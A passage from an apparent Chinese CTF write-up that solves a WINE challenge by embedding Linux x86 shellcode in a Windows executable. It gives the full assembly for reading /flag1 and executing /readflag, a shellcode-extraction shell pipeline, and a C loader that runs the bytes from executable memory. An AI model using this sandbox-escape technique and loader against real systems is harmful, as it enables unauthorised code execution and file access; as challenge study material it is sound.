## 0x04 杯窗鹅影
根据[Attacking applications running under WINE (Part I)](https://schlafwandler.github.io/posts/attacking-wine-part-i/)这篇博客。可以得知，wine不是模拟器，而是添加了一层转换层，会将windows api转换成宿主机的api，达到运行windows exe的目的。  

所以wine运行exe时，如果exe中有目标为`宿主机平台`的shellcode，是可以直接执行的！

编写如下的汇编代码，主要作用是读取文件`/flag1`获得flag1，然后调用execve系统调用，execve `/flag2`获得flag2。

```
global _start
_start:
; flag1
    sub esp, 0xff
    mov eax, 0x616c662f
    mov [esp], eax
    mov eax, 0x00003167
    mov [esp+4], eax

    mov eax, 0x5    ; open
    xor ecx, ecx    ; flags
    xor edx, edx    ; mode
    mov ebx, esp    ; filename
    int 0x80
    add esp, 0xff

    mov ebx, eax    ; fd
    mov eax, 0x3    ; read
    mov edx, 0xFF   ; count
    sub esp, 0xff   ; buffer
    mov ecx, esp
    int 0x80

    mov edx, eax    ; count
    mov eax, 0x4    ; write 
    mov ebx, 0x2    ; fd
    mov ecx, esp    ; buffer
    int 0x80
    add esp, 0xff

; flag2
    sub esp, 0xff
    mov eax, 0x6165722f
    mov [esp], eax
    mov eax, 0x616c6664
    mov [esp+4], eax
    mov eax, 0x00000067
    mov [esp+8], eax

    mov eax, 0xb    ; execve 
    mov ebx, esp    ; filename
    xor ecx, ecx    ; argv
    xor edx, edx    ; envp
    int 0x80
    add esp, 0xff

    ret
```

将其编译，并提取字节码：
```
#!/bin/bash
nasm -f elf32 -o shellcode.o shellcode.asm
ld -melf_i386 -o shellcode shellcode.o
objdump -d shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' '| tr -s ' '| tr '\t' ' '| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```

放到main.c里：
```
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "\x81\xec\xff\x00\x00\x00\xb8\x2f\x66\x6c\x61\x89\x04\x24\xb8\x67\x31\x00\x00\x89\x44\x24\x04\xb8\x05\x00\x00\x00\x31\xc9\x31\xd2\x89\xe3\xcd\x80\x81\xc4\xff\x00\x00\x00\x89\xc3\xb8\x03\x00\x00\x00\xba\xff\x00\x00\x00\x81\xec\xff\x00\x00\x00\x89\xe1\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xe1\xcd\x80\x81\xc4\xff\x00\x00\x00\x81\xec\xff\x00\x00\x00\xb8\x2f\x72\x65\x61\x89\x04\x24\xb8\x64\x66\x6c\x61\x89\x44\x24\x04\xb8\x67\x00\x00\x00\x89\x44\x24\x08\xb8\x0b\x00\x00\x00\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x81\xc4\xff\x00\x00\x00\xc3";

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    LPVOID buffer = VirtualAlloc(NULL, 8192, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memset(buffer, 0, 8192);

    void (*pcode)() = (void (*)())buffer;

    memcpy(buffer, shellcode, sizeof(shellcode));
    pcode();

    return 0;
}
```
编译上传，即可获得flag。